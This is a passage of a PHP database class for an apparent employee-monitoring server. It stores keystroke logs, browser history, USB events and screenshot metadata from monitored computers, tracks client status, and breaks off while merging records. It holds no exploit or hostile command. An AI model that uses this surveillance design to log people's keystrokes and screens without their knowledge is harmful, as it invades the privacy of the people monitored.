<?php
/**
 * Database Service Class
 * Handles all database operations for the Monitor application
 * Replaces stored procedures and triggers with PHP functions
 */

class DatabaseService {
    private $mysqli;
    
    public function __construct($mysqli) {
        $this->mysqli = $mysqli;
    }
    
    /**
     * Get monitor IP ID by IP address or MAC address
     * Handles duplicate entries by returning the most recent one
     */
    public function getMonitorIpId($ip_address = null, $mac_address = null) {
        $ip_id = null;
        
        if ($ip_address) {
            // Get the most recent record for this IP address (handles duplicates)
            $stmt = $this->mysqli->prepare("
                SELECT id FROM tbl_monitor_ips 
                WHERE ip_address = ? 
                ORDER BY updated_at DESC, created_at DESC, id DESC 
                LIMIT 1
            ");
            $stmt->bind_param("s", $ip_address);
            $stmt->execute();
            $result = $stmt->get_result();
            if ($row = $result->fetch_assoc()) {
                $ip_id = $row['id'];
            }
            $stmt->close();
        }
        
        if (!$ip_id && $mac_address) {
            // Get the most recent record for this MAC address (handles duplicates)
            $stmt = $this->mysqli->prepare("
                SELECT id FROM tbl_monitor_ips 
                WHERE mac_address = ? 
                ORDER BY updated_at DESC, created_at DESC, id DESC 
                LIMIT 1
            ");
            $stmt->bind_param("s", $mac_address);
            $stmt->execute();
            $result = $stmt->get_result();
            if ($row = $result->fetch_assoc()) {
                $ip_id = $row['id'];
            }
            $stmt->close();
        }
        
        return $ip_id;
    }
    
    /**
     * Add browser history logs to database
     * Handles data from all platforms: Windows, macOS, Ubuntu
     */
    public function addBrowserHistoryLogs($browserHistories, $ip_address = null, $mac_address = null) {
        $ip_id = $this->getMonitorIpId($ip_address, $mac_address);
        if (!$ip_id) {
            error_log("Could not find monitor IP ID for IP: $ip_address, MAC: $mac_address");
            return false;
        }
        
        $stmt = $this->mysqli->prepare("
            INSERT INTO browser_history_logs (monitor_ip_id, browser, url, title, last_visit, visit_date) 
            VALUES (?, ?, ?, ?, ?, ?)
        ");
        
        $inserted_count = 0;
        foreach ($browserHistories as $browserHistory) {
            try {
                $browser = $browserHistory['browser'] ?? '';
                $url = $browserHistory['url'] ?? '';
                $title = $browserHistory['title'] ?? '';
                
                // Skip records with missing required fields
                if (empty($browser) || empty($url)) {
                    error_log("Skipping browser history record with missing fields: browser=" . ($browser ?: 'empty') . ", url=" . ($url ?: 'empty'));
                    continue;
                }
                
                // Handle different platform data formats
                $lastVisit = $this->normalizeDateTime($browserHistory['last_visit'] ?? null);
                $visitDate = $this->normalizeDateTime($browserHistory['date'] ?? null);
                
                $stmt->bind_param("isssss", $ip_id, $browser, $url, $title, $lastVisit, $visitDate);
                if ($stmt->execute()) {
                    $inserted_count++;
                    // Update storage statistics
                    $this->updateStorageStatistics($ip_id, 'browser_history', $visitDate, strlen($url) + strlen($title));
                } else {
                    error_log("Failed to insert browser history: " . $stmt->error . " - Browser: $browser, URL: " . substr($url, 0, 100));
                }
            } catch (Exception $e) {
                error_log("Error processing browser history record: " . $e->getMessage());
                continue;
            }
        }
        
        $stmt->close();
        return $inserted_count;
    }
    
    /**
     * Normalize datetime values from different platforms
     * Handles: Int64 timestamps (macOS), String datetimes (Windows), Missing fields (Ubuntu)
     */
    private function normalizeDateTime($value) {
        if ($value === null || $value === '') {
            return date('Y-m-d H:i:s');
        }
        
        // If it's a numeric timestamp (macOS sends Int64)
        if (is_numeric($value)) {
            $timestamp = (int)$value;
            
            // Handle Windows epoch microseconds (very large numbers like 13404779250090721)
            // Windows epoch starts at 1601-01-01, Unix epoch starts at 1970-01-01
            // Difference: 11644473600 seconds = 11644473600000000 microseconds
            if ($timestamp > 10000000000000000) {
                // Windows epoch microseconds - convert to Unix epoch seconds
                $unixTimestamp = ($timestamp / 1000000) - 11644473600;
                return date('Y-m-d H:i:s', (int)$unixTimestamp);
            } elseif ($timestamp > 1000000000000) {
                // Milliseconds since epoch (JavaScript style)
                return date('Y-m-d H:i:s', $timestamp / 1000);
            } elseif ($timestamp > 1000000000) {
                // Seconds since epoch (Unix timestamp)
                return date('Y-m-d H:i:s', $timestamp);
            } else {
                // Microseconds since epoch (some browsers)
                return date('Y-m-d H:i:s', $timestamp / 1000000);
            }
        }
        
        // If it's already a string, try to parse it
        if (is_string($value)) {
            // Try to parse common datetime formats
            $parsed = strtotime($value);
            if ($parsed !== false) {
                return date('Y-m-d H:i:s', $parsed);
            }
            
            // If parsing fails, return as-is (might be valid MySQL datetime)
            return $value;
        }
        
        // Fallback to current time
        return date('Y-m-d H:i:s');
    }
    
    /**
     * Add key logs to database
     * Handles data from all platforms: Windows, macOS, Ubuntu
     */
    public function addKeyLogs($keyLogs, $ip_address = null, $mac_address = null) {
        $ip_id = $this->getMonitorIpId($ip_address, $mac_address);
        if (!$ip_id) {
            error_log("Could not find monitor IP ID for IP: $ip_address, MAC: $mac_address");
            return false;
        }
        
        $stmt = $this->mysqli->prepare("
            INSERT INTO key_logs (monitor_ip_id, key_date, application, key_pressed) 
            VALUES (?, ?, ?, ?)
        ");
        
        $inserted_count = 0;
        foreach ($keyLogs as $keyLog) {
            $keyDate = $this->normalizeDateTime($keyLog['date'] ?? null);
            $application = $keyLog['application'] ?? '';
            $keyPressed = $keyLog['key'] ?? '';
            
            // Skip records with missing required fields
            if (empty($application) || empty($keyPressed)) {
                continue;
            }
            
            $stmt->bind_param("isss", $ip_id, $keyDate, $application, $keyPressed);
            if ($stmt->execute()) {
                $inserted_count++;
                // Update storage statistics
                $this->updateStorageStatistics($ip_id, 'key_logs', $keyDate, strlen($application) + strlen($keyPressed));
            }
        }
        
        $stmt->close();
        return $inserted_count;
    }
    
    /**
     * Add USB device logs to database
     * Handles data from all platforms: Windows, macOS, Ubuntu
     */
    public function addUSBDeviceLogs($usbLogs, $ip_address = null, $mac_address = null) {
        $ip_id = $this->getMonitorIpId($ip_address, $mac_address);
        if (!$ip_id) {
            error_log("Could not find monitor IP ID for IP: $ip_address, MAC: $mac_address");
            return false;
        }
        
        $stmt = $this->mysqli->prepare("
            INSERT INTO usb_device_logs (monitor_ip_id, device_date, device_name, device_path, device_type, action) 
            VALUES (?, ?, ?, ?, ?, ?)
        ");
        
        $inserted_count = 0;
        foreach ($usbLogs as $usbLog) {
            $deviceDate = $this->normalizeDateTime($usbLog['date'] ?? null);
            $deviceName = $usbLog['device_name'] ?? '';
            $devicePath = $usbLog['device_path'] ?? '';
            $deviceType = $usbLog['device_type'] ?? '';
            $action = $usbLog['action'] ?? 'Connected';
            
            // Skip records with missing required fields
            if (empty($deviceName)) {
                continue;
            }
            
            $stmt->bind_param("isssss", $ip_id, $deviceDate, $deviceName, $devicePath, $deviceType, $action);
            if ($stmt->execute()) {
                $inserted_count++;
                // Update storage statistics
                $this->updateStorageStatistics($ip_id, 'usb_logs', $deviceDate, strlen($deviceName) + strlen($devicePath) + strlen($deviceType));
            }
        }
        
        $stmt->close();
        return $inserted_count;
    }
    
    /**
     * Add screenshot metadata to database
     */
    public function addScreenshotMetadata($ip_id, $filename, $file_path, $thumbnail_path, $capture_datetime, $file_size, $image_width, $image_height, $file_extension = 'jpg') {
        $stmt = $this->mysqli->prepare("
            INSERT INTO screenshot_metadata (monitor_ip_id, filename, file_path, thumbnail_path, capture_datetime, file_size, image_width, image_height, file_extension) 
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        ");
        
        $stmt->bind_param("issssiiis", $ip_id, $filename, $file_path, $thumbnail_path, $capture_datetime, $file_size, $image_width, $image_height, $file_extension);
        $result = $stmt->execute();
        $stmt->close();
        
        if ($result) {
            // Update storage statistics
            $this->updateStorageStatistics($ip_id, 'screenshots', $capture_datetime, $file_size);
        }
        
        return $result;
    }
    
    /**
     * Update storage statistics
     */
    private function updateStorageStatistics($monitor_ip_id, $data_type, $date, $size) {
        $month_year = date('Y-m', strtotime($date));
        
        $stmt = $this->mysqli->prepare("
            INSERT INTO storage_statistics (monitor_ip_id, data_type, month_year, record_count, total_size) 
            VALUES (?, ?, ?, 1, ?) 
            ON DUPLICATE KEY UPDATE 
            record_count = record_count + 1, 
            total_size = total_size + ?, 
            last_updated = CURRENT_TIMESTAMP
        ");
        
        $stmt->bind_param("issii", $monitor_ip_id, $data_type, $month_year, $size, $size);
        $stmt->execute();
        $stmt->close();
    }
    
    /**
     * Get recent browser history (last 7 days)
     */
    public function getRecentBrowserHistory($limit = 100) {
        $stmt = $this->mysqli->prepare("
            SELECT * FROM recent_browser_history 
            ORDER BY visit_date DESC 
            LIMIT ?
        ");
        
        $stmt->bind_param("i", $limit);
        $stmt->execute();
        $result = $stmt->get_result();
        $data = $result->fetch_all(MYSQLI_ASSOC);
        $stmt->close();
        
        return $data;
    }
    
    /**
     * Get recent key logs (last 7 days)
     */
    public function getRecentKeyLogs($limit = 100) {
        $stmt = $this->mysqli->prepare("
            SELECT * FROM recent_key_logs 
            ORDER BY key_date DESC 
            LIMIT ?
        ");
        
        $stmt->bind_param("i", $limit);
        $stmt->execute();
        $result = $stmt->get_result();
        $data = $result->fetch_all(MYSQLI_ASSOC);
        $stmt->close();
        
        return $data;
    }
    
    /**
     * Get recent USB activity (last 7 days)
     */
    public function getRecentUSBActivity($limit = 100) {
        $stmt = $this->mysqli->prepare("
            SELECT * FROM recent_usb_activity 
            ORDER BY device_date DESC 
            LIMIT ?
        ");
        
        $stmt->bind_param("i", $limit);
        $stmt->execute();
        $result = $stmt->get_result();
        $data = $result->fetch_all(MYSQLI_ASSOC);
        $stmt->close();
        
        return $data;
    }
    
    /**
     * Get recent screenshots (last 7 days)
     */
    public function getRecentScreenshots($limit = 100) {
        $stmt = $this->mysqli->prepare("
            SELECT * FROM recent_screenshots 
            ORDER BY capture_datetime DESC 
            LIMIT ?
        ");
        
        $stmt->bind_param("i", $limit);
        $stmt->execute();
        $result = $stmt->get_result();
        $data = $result->fetch_all(MYSQLI_ASSOC);
        $stmt->close();
        
        return $data;
    }
    
    /**
     * Get monthly statistics for a specific monitor IP
     */
    public function getMonthlyStatistics($monitor_ip_id, $month_year) {
        $stmt = $this->mysqli->prepare("
            SELECT 
                'browser_history' as data_type,
                COUNT(*) as record_count,
                SUM(LENGTH(url) + LENGTH(title)) as total_size
            FROM browser_history_logs 
            WHERE monitor_ip_id = ? 
            AND DATE_FORMAT(visit_date, '%Y-%m') = ?
            
            UNION ALL
            
            SELECT 
                'key_logs' as data_type,
                COUNT(*) as record_count,
                SUM(LENGTH(application) + LENGTH(key_pressed)) as total_size
            FROM key_logs 
            WHERE monitor_ip_id = ? 
            AND DATE_FORMAT(key_date, '%Y-%m') = ?
            
            UNION ALL
            
            SELECT 
                'usb_logs' as data_type,
                COUNT(*) as record_count,
                SUM(LENGTH(device_name) + LENGTH(device_path) + LENGTH(device_type)) as total_size
            FROM usb_device_logs 
            WHERE monitor_ip_id = ? 
            AND DATE_FORMAT(device_date, '%Y-%m') = ?
            
            UNION ALL
            
            SELECT 
                'screenshots' as data_type,
                COUNT(*) as record_count,
                SUM(file_size) as total_size
            FROM screenshot_metadata 
            WHERE monitor_ip_id = ? 
            AND DATE_FORMAT(capture_datetime, '%Y-%m') = ?
        ");
        
        $stmt->bind_param("isisisis", $monitor_ip_id, $month_year, $monitor_ip_id, $month_year, $monitor_ip_id, $month_year, $monitor_ip_id, $month_year);
        $stmt->execute();
        $result = $stmt->get_result();
        $data = $result->fetch_all(MYSQLI_ASSOC);
        $stmt->close();
        
        return $data;
    }
    
    /**
     * Get storage statistics from the statistics table
     */
    public function getStorageStatistics($monitor_ip_id = null) {
        $sql = "SELECT * FROM storage_statistics";
        $params = [];
        $types = "";
        
        if ($monitor_ip_id) {
            $sql .= " WHERE monitor_ip_id = ?";
            $params[] = $monitor_ip_id;
            $types .= "i";
        }
        
        $sql .= " ORDER BY month_year DESC, data_type";
        
        $stmt = $this->mysqli->prepare($sql);
        if (!empty($params)) {
            $stmt->bind_param($types, ...$params);
        }
        
        $stmt->execute();
        $result = $stmt->get_result();
        $data = $result->fetch_all(MYSQLI_ASSOC);
        $stmt->close();
        
        return $data;
    }
    
    /**
     * Update monitor IP last activity timestamps
     * Now uses updated_at as the single source of truth for last activity
     */
    public function updateMonitorActivity($ip_address, $activity_type = 'monitor') {
        $current_time = date('Y-m-d H:i:s');
        
        $stmt = $this->mysqli->prepare("
            UPDATE tbl_monitor_ips 
            SET updated_at = ? 
            WHERE ip_address = ?
        ");
        
        $stmt->bind_param("ss", $current_time, $ip_address);
        $result = $stmt->execute();
        $stmt->close();
        
        return $result;
    }
    
    /**
     * Calculate client status based on updated_at timestamp
     * This is the single source of truth for status calculation across the entire application
     * Uses exact UI logic: time_diff <= 300 = 'online', time_diff <= 3600 = 'inactive', time_diff > 3600 = 'offline'
     * 
     * @param string|null $updated_at The updated_at timestamp from database
     * @return array Status information: ['status' => 'online'|'inactive'|'offline', 'status_class' => 'success'|'warning'|'danger', 'status_text' => 'Online'|'Inactive'|'Offline', 'time_diff' => seconds, 'updated_at_timestamp' => unix timestamp]
     */
    public function calculateClientStatus($updated_at) {
        $updated_at_value = $updated_at ?? null;
        $updated_at_timestamp = ($updated_at_value !== null && $updated_at_value !== '') ? strtotime($updated_at_value) : 0;
        $time_diff = time() - $updated_at_timestamp;
        
        // Use exact UI logic:
        // time_diff <= 300 (5 minutes) = 'online'
        // time_diff <= 3600 (1 hour) = 'inactive'
        // time_diff > 3600 (1 hour) = 'offline'
        if ($updated_at_timestamp === 0) {
            // No activity recorded
            $status = 'offline';
            $status_class = 'danger';
            $status_text = 'Offline';
        } elseif ($time_diff <= 300) {
            // 5 minutes - online
            $status = 'online';
            $status_class = 'success';
            $status_text = 'Online';
        } elseif ($time_diff <= 3600) {
            // 1 hour - inactive
            $status = 'inactive';
            $status_class = 'warning';
            $status_text = 'Inactive';
        } else {
            // More than 1 hour - offline
            $status = 'offline';
            $status_class = 'danger';
            $status_text = 'Offline';
        }
        
        return [
            'status' => $status,
            'status_class' => $status_class,
            'status_text' => $status_text,
            'time_diff' => $time_diff,
            'updated_at_timestamp' => $updated_at_timestamp,
            'live_status' => $status, // Alias for backward compatibility
        ];
    }
    
    /**
     * Calculate dynamic status based on updated_at timestamp
     * Returns: 'active' if within 5 minutes, 'inactive' if more than 5 minutes
     * @deprecated Use calculateClientStatus() instead for consistency
     */
    public function calculateDynamicStatus($updated_at) {
        if (!$updated_at) {
            return 'inactive';
        }
        
        $last_activity = strtotime($updated_at);
        $current_time = time();
        $time_diff = $current_time - $last_activity;
        
        // 5 minutes = 300 seconds
        return ($time_diff <= 300) ? 'active' : 'inactive';
    }
    
    /**
     * Get status text and CSS class for dynamic status
     * @deprecated Use calculateClientStatus() instead for consistency
     */
    public function getStatusDisplay($updated_at) {
        $statusInfo = $this->calculateClientStatus($updated_at);
        
        return [
            'status' => $statusInfo['status'],
            'text' => $statusInfo['status_text'],
            'class' => $statusInfo['status_class'],
            'icon' => 'fas fa-circle'
        ];
    }
    
    /**
     * Get monitor IP information
     */
    public function getMonitorIP($ip_address) {
        $stmt = $this->mysqli->prepare("
            SELECT * FROM tbl_monitor_ips WHERE ip_address = ?
        ");
        
        $stmt->bind_param("s", $ip_address);
        $stmt->execute();
        $result = $stmt->get_result();
        $data = $result->fetch_assoc();
        $stmt->close();
        
        return $data;
    }
    
    /**
     * Create or update monitor IP record
     * Properly handles existing records by checking first, then updating
     */
    public function createOrUpdateMonitorIP($ip_address, $mac_address = null, $username = null, $app_version = null) {
        // First, check if record exists
        $existing = $this->getMonitorIP($ip_address);
        
        if ($existing) {
            // Update existing record - only update fields that are not null
            $update_fields = [];
            $params = [];
            $types = "";
            
            if ($mac_address !== null) {
                $update_fields[] = "mac_address = ?";
                $params[] = $mac_address;
                $types .= "s";
            }
            
            // Username updates are only allowed through admin edit page, not from client requests
            // if ($username !== null) {
            //     $update_fields[] = "username = ?";
            //     $params[] = $username;
            //     $types .= "s";
            // }
            
            if ($app_version !== null) {
                $update_fields[] = "app_version = ?";
                $params[] = $app_version;
                $types .= "s";
            }
            
            // Always update updated_at timestamp
            // Make this timestamp to be the last activity timestamp
            $update_fields[] = "updated_at = NOW()";
            $params[] = $ip_address;
            $types .= "s";
            
            if (!empty($update_fields)) {
                $stmt = $this->mysqli->prepare("
                    UPDATE tbl_monitor_ips 
                    SET " . implode(", ", $update_fields) . "
                    WHERE ip_address = ?
                ");
                
                $stmt->bind_param($types, ...$params);
                $result = $stmt->execute();
                $stmt->close();
                
                return $result;
            }
            
            return true; // No fields to update, but record exists
        } else {
            // Create new record
            $stmt = $this->mysqli->prepare("
                INSERT INTO tbl_monitor_ips (ip_address, mac_address, username, app_version) 
                VALUES (?, ?, ?, ?)
            ");
            
            $stmt->bind_param("ssss", $ip_address, $mac_address, $username, $app_version);
            $result = $stmt->execute();
            $stmt->close();
            
            return $result;
        }
    }
    
    /**
     * Clean up duplicate monitor IP entries
     * Keeps the most recent record and removes older duplicates
     */
    public function cleanupDuplicateMonitorIPs() {
        $cleaned_count = 0;
        
        // Find all duplicate IP addresses
        $stmt = $this->mysqli->prepare("
            SELECT ip_address, COUNT(*) as count 
            FROM tbl_monitor_ips 
            GROUP BY ip_address 
            HAVING COUNT(*) > 1
        ");
        $stmt->execute();
        $result = $stmt->get_result();
        $duplicates = $result->fetch_all(MYSQLI_ASSOC);
        $stmt->close();
        
        foreach ($duplicates as $duplicate) {
            $ip_address = $duplicate['ip_address'];
            
            // Get all records for this IP, ordered by most recent first
            $stmt = $this->mysqli->prepare("
                SELECT id FROM tbl_monitor_ips 
                WHERE ip_address = ? 
                ORDER BY updated_at DESC, created_at DESC, id DESC
            ");
            $stmt->bind_param("s", $ip_address);
            $stmt->execute();
            $result = $stmt->get_result();
            $records = $result->fetch_all(MYSQLI_ASSOC);
            $stmt->close();
            
            // Keep the first (most recent) record, delete the rest
            if (count($records) > 1) {
                $keep_id = $records[0]['id'];
                $delete_ids = array_slice(array_column($records, 'id'), 1);
                
                if (!empty($delete_ids)) {
                    $placeholders = str_repeat('?,', count($delete_ids) - 1) . '?';
                    $stmt = $this->mysqli->prepare("
                        DELETE FROM tbl_monitor_ips 
                        WHERE id IN ($placeholders)
                    ");
                    $stmt->bind_param(str_repeat('i', count($delete_ids)), ...$delete_ids);
                    $stmt->execute();
                    $cleaned_count += $stmt->affected_rows;
                    $stmt->close();
                    
                    error_log("Cleaned up " . count($delete_ids) . " duplicate records for IP: $ip_address, kept ID: $keep_id");
                }
            }
        }
        
        return $cleaned_count;
    }
    
    /**
     * Get data migration status
     */
    public function getMigrationStatus($monitor_ip_id = null) {
        $sql = "SELECT * FROM data_migration_status";
        $params = [];
        $types = "";
        
        if ($monitor_ip_id) {
            $sql .= " WHERE monitor_ip_id = ?";
            $params[] = $monitor_ip_id;
            $types .= "i";
        }
        
        $sql .= " ORDER BY migration_date DESC";
        
        $stmt = $this->mysqli->prepare($sql);
        if (!empty($params)) {
            $stmt->bind_param($types, ...$params);
        }
        
        $stmt->execute();
        $result = $stmt->get_result();
        $data = $result->fetch_all(MYSQLI_ASSOC);
        $stmt->close();
        
        return $data;
    }
    
    /**
     * Update migration status
     */
    public function updateMigrationStatus($migration_type, $monitor_ip_id, $source_path, $records_migrated, $status, $error_message = null) {
        $stmt = $this->mysqli->prepare("
            INSERT INTO data_migration_status (migration_type, monitor_ip_id, source_path, records_migrated, migration_date, status, error_message) 
            VALUES (?, ?, ?, ?, NOW(), ?, ?)
        ");
        
        $stmt->bind_param("sisiss", $migration_type, $monitor_ip_id, $source_path, $records_migrated, $status, $error_message);
        $result = $stmt->execute();
        $stmt->close();
        
        return $result;
    }
    
    /**
     * Ensure daily API log table exists for the given date
     * Creates table if it doesn't exist
     * 
     * @param string|null $date Date in YYYY-MM-DD format, or null for today
     * @return string Table name
     */
    public function ensureDailyLogTable($date = null) {
        if ($date === null) {
            $date = date('Y-m-d');
        }
        
        // Validate date format
        if (!preg_match('/^\d{4}-\d{2}-\d{2}$/', $date)) {
            $date = date('Y-m-d');
        }
        
        $table_name = 'api_logs_' . str_replace('-', '_', $date);
        
        // Check if table exists
        $check_sql = "SHOW TABLES LIKE '$table_name'";
        $result = $this->mysqli->query($check_sql);
        
        if ($result && $result->num_rows > 0) {
            // Table exists
            $result->free();
            return $table_name;
        }
        
        // Create table
        $create_sql = "
            CREATE TABLE `$table_name` (
              `id` bigint(20) NOT NULL AUTO_INCREMENT,
              `endpoint` varchar(255) NOT NULL,
              `method` varchar(10) NOT NULL,
              `request_type` varchar(50) DEFAULT NULL,
              `ip_address` varchar(45) NOT NULL,
              `status_code` int(11) NOT NULL,
              `response_time_ms` decimal(10,2) NOT NULL,
              `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
              PRIMARY KEY (`id`),
              KEY `idx_endpoint` (`endpoint`),
              KEY `idx_request_type` (`request_type`),
              KEY `idx_ip_address` (`ip_address`),
              KEY `idx_status_code` (`status_code`),
              KEY `idx_created_at` (`created_at`)
            ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci
        ";
        
        if ($this->mysqli->query($create_sql)) {
            error_log("Created daily API log table: $table_name");
            return $table_name;
        } else {
            error_log("Failed to create daily API log table: " . $this->mysqli->error);
            return false;
        }
    }
    
    /**
     * Log API request to daily log table
     * 
     * @param string $endpoint API endpoint (e.g., '/eventhandler.php')
     * @param string $method HTTP method (GET, POST, etc.)
     * @param string $ip_address Client IP address
     * @param int $status_code HTTP status code
     * @param float $response_time_ms Response time in milliseconds
     * @param string|null $request_type Request type (e.g., 'Tic', 'BrowserHistory', 'KeyLog', 'USBLog', 'screenshot', 'config', etc.)
     * @return bool Success status
     */
    public function logApiRequest($endpoint, $method, $ip_address, $status_code, $response_time_ms, $request_type = null) {
        // Ensure daily table exists
        $table_name = $this->ensureDailyLogTable();
        if (!$table_name) {
            return false;
        }
        
        // Check if request_type column exists (for backward compatibility with existing tables)
        $column_exists = false;
        $check_column = $this->mysqli->query("SHOW COLUMNS FROM `$table_name` LIKE 'request_type'");
        if ($check_column && $check_column->num_rows > 0) {
            $column_exists = true;
            $check_column->free();
        }
        
        // Prepare insert statement
        if ($column_exists) {
            $stmt = $this->mysqli->prepare("
                INSERT INTO `$table_name` (endpoint, method, request_type, ip_address, status_code, response_time_ms) 
                VALUES (?, ?, ?, ?, ?, ?)
            ");
            $stmt->bind_param("ssssid", $endpoint, $method, $request_type, $ip_address, $status_code, $response_time_ms);
        } else {
            // Fallback for tables created before request_type was added
            $stmt = $this->mysqli->prepare("
                INSERT INTO `$table_name` (endpoint, method, ip_address, status_code, response_time_ms) 
                VALUES (?, ?, ?, ?, ?)
            ");
            $stmt->bind_param("sssid", $endpoint, $method, $ip_address, $status_code, $response_time_ms);
        }
        
        if (!$stmt) {
            error_log("Failed to prepare API log statement: " . $this->mysqli->error);
            return false;
        }
        
        $result = $stmt->execute();
        
        if (!$result) {
            error_log("Failed to log API request: " . $stmt->error);
        }
        
        $stmt->close();
        return $result;

    }

    /**
     * Get inactive clients grouped by slack_id (or username if slack_id is empty)
     * Returns array grouped by slack_id/username with detailed status information
     * Uses exact same offline logic as UI views: offline = time_diff > 3600 seconds (1 hour)
     * Filters in PHP to ensure 100% consistency with UI status calculations
     */
    public function getInactiveClientsGroupedByUser($threshold_minutes = 5) {
        // Get all clients from database (no SQL filtering to ensure exact PHP calculation)
        $stmt = $this->mysqli->prepare("
            SELECT 
                m.*,
                COALESCE(s.last_screenshot, '0000-00-00 00:00:00') as last_screenshot,
                COALESCE(k.last_keylog, '0000-00-00 00:00:00') as last_keylog,
                COALESCE(b.last_browser, '0000-00-00 00:00:00') as last_browser,
                COALESCE(u.last_usb, '0000-00-00 00:00:00') as last_usb
            FROM tbl_monitor_ips m
            LEFT JOIN (
                SELECT monitor_ip_id, MAX(capture_datetime) as last_screenshot
                FROM screenshot_metadata 
                GROUP BY monitor_ip_id
            ) s ON m.id = s.monitor_ip_id
            LEFT JOIN (
                SELECT monitor_ip_id, MAX(key_date) as last_keylog
                FROM key_logs 
                GROUP BY monitor_ip_id
            ) k ON m.id = k.monitor_ip_id
            LEFT JOIN (
                SELECT monitor_ip_id, MAX(visit_date) as last_browser
                FROM browser_history_logs 
                GROUP BY monitor_ip_id
            ) b ON m.id = b.monitor_ip_id
            LEFT JOIN (
                SELECT monitor_ip_id, MAX(device_date) as last_usb
                FROM usb_device_logs 
                GROUP BY monitor_ip_id
            ) u ON m.id = u.monitor_ip_id
            ORDER BY COALESCE(m.slack_id, m.username), m.name
        ");
        
        $stmt->execute();
        $result = $stmt->get_result();
        $clients = $result->fetch_all(MYSQLI_ASSOC);
        $stmt->close();
        
        // Group by slack_id (or username if slack_id is empty) and add status information
        // Use calculateClientStatus() for consistent status calculation
        $grouped_clients = [];
        foreach ($clients as $client) {
            // Calculate status using the generic function
            $statusInfo = $this->calculateClientStatus($client['updated_at'] ?? null);
            
            // Only include clients that are actually "offline" according to UI logic
            if ($statusInfo['status'] === 'offline') {
                // Use slack_id if available, otherwise fall back to username
                $group_key = !empty($client['slack_id']) ? $client['slack_id'] : ($client['username'] ?? 'Unknown');
                $client['status'] = $statusInfo['status'];
                $client['last_update'] = $client['updated_at'];
                
                if (!isset($grouped_clients[$group_key])) {
                    $grouped_clients[$group_key] = [];
                }
                
                $grouped_clients[$group_key][] = $client;
            }
        }
        
        return $grouped_clients;
    }
    
    /**
     * Get detailed status for a specific client
     * Returns last activity times for different monitoring types
     */
    public function getClientDetailedStatus($monitor_ip_id) {
        $stmt = $this->mysqli->prepare("
            SELECT 
                m.id,
                m.ip_address,
                m.name,
                m.username,
                m.last_monitor_tic,
                m.last_browser_tic,
                m.updated_at,
                COALESCE(s.last_screenshot, '0000-00-00 00:00:00') as last_screenshot,
                COALESCE(k.last_keylog, '0000-00-00 00:00:00') as last_keylog,
                COALESCE(b.last_browser, '0000-00-00 00:00:00') as last_browser,
                COALESCE(u.last_usb, '0000-00-00 00:00:00') as last_usb
            FROM tbl_monitor_ips m
            LEFT JOIN (
                SELECT monitor_ip_id, MAX(capture_datetime) as last_screenshot
                FROM screenshot_metadata 
                WHERE monitor_ip_id = ?
                GROUP BY monitor_ip_id
            ) s ON m.id = s.monitor_ip_id
            LEFT JOIN (
                SELECT monitor_ip_id, MAX(key_date) as last_keylog
                FROM key_logs 
                WHERE monitor_ip_id = ?
                GROUP BY monitor_ip_id
            ) k ON m.id = k.monitor_ip_id
            LEFT JOIN (
                SELECT monitor_ip_id, MAX(visit_date) as last_browser
                FROM browser_history_logs 
                WHERE monitor_ip_id = ?
                GROUP BY monitor_ip_id
            ) b ON m.id = b.monitor_ip_id
            LEFT JOIN (
                SELECT monitor_ip_id, MAX(device_date) as last_usb
                FROM usb_device_logs 
                WHERE monitor_ip_id = ?
                GROUP BY monitor_ip_id
            ) u ON m.id = u.monitor_ip_id
            WHERE m.id = ?
        ");
        
        $stmt->bind_param("iiiii", $monitor_ip_id, $monitor_ip_id, $monitor_ip_id, $monitor_ip_id, $monitor_ip_id);
        $stmt->execute();
        $result = $stmt->get_result();
        $client = $result->fetch_assoc();
        $stmt->close();
        
        if ($client) {
            $statusInfo = $this->calculateClientStatus($client['updated_at']);
            $client['status'] = $statusInfo['status'];
            $client['status_class'] = $statusInfo['status_class'];
            $client['status_text'] = $statusInfo['status_text'];
            $client['live_status'] = $statusInfo['live_status'];
            $client['last_update'] = $client['updated_at'];
        }
        
        return $client;
    }
    
    /**
     * Merge logs from source monitor IP to target monitor IP
     * Updates all log tables, moves log files, and deletes source entry
     * 
     * @param int $source_ip_id Source monitor IP ID
     * @param int $target_ip_id Target monitor IP ID
     * @return array Result with success status and details
     */
    public function mergeMonitorLogs($source_ip_id, $target_ip_id) {
        // Validate inputs
        if ($source_ip_id == $target_ip_id) {
            return [
                'success' => false,
                'error' => 'Source and target cannot be the same'
            ];
        }
        
        // Get source and target monitor info
        $source_stmt = $this->mysqli->prepare("SELECT * FROM tbl_monitor_ips WHERE id = ?");
        $source_stmt->bind_param("i", $source_ip_id);
        $source_stmt->execute();
        $source_result = $source_stmt->get_result();
        $source_monitor = $source_result->fetch_assoc();
        $source_stmt->close();
        
        if (!$source_monitor) {
            return [
                'success' => false,
                'error' => 'Source monitor not found'
            ];
        }
        
        $target_stmt = $this->mysqli->prepare("SELECT * FROM tbl_monitor_ips WHERE id = ?");
        $target_stmt->bind_param("i", $target_ip_id);
        $target_stmt->execute();
        $target_result = $target_stmt->get_result();
        $target_monitor = $target_result->fetch_assoc();
        $target_stmt->close();
        
        if (!$target_monitor) {
            return [
                'success' => false,
                'error' => 'Target monitor not found'
            ];
        }
        
        $source_ip = $source_monitor['ip_address'];
        $target_ip = $target_monitor['ip_address'];
        
        // Start transaction
        $this->mysqli->begin_transaction();
        
        try {
            $stats = [
                'browser_history_logs' => 0,
                'key_logs' => 0,
                'usb_device_logs' => 0,
                'screenshot_metadata' => 0,
                'storage_statistics' => 0
            ];
            
            // Update browser_history_logs
            $stmt = $this->mysqli->prepare("UPDATE browser_history_logs SET monitor_ip_id = ? WHERE monitor_ip_id = ?");
            $stmt->bind_param("ii", $target_ip_id, $source_ip_id);
            $stmt->execute();
            $stats['browser_history_logs'] = $stmt->affected_rows;
            $stmt->close();
            
            // Update key_logs
            $stmt = $this->mysqli->prepare("UPDATE key_logs SET monitor_ip_id = ? WHERE monitor_ip_id = ?");
            $stmt->bind_param("ii", $target_ip_id, $source_ip_id);
            $stmt->execute();
            $stats['key_logs'] = $stmt->affected_rows;
            $stmt->close();
            
            // Update usb_device_logs
            $stmt = $this->mysqli->prepare("UPDATE usb_device_logs SET monitor_ip_id = ? WHERE monitor_ip_id = ?");
            $stmt->bind_param("ii", $target_ip_id, $source_ip_id);
            $stmt->execute();
            $stats['usb_device_logs'] = $stmt->affected_rows;
            $stmt->close();
            
            // Update screenshot_metadata
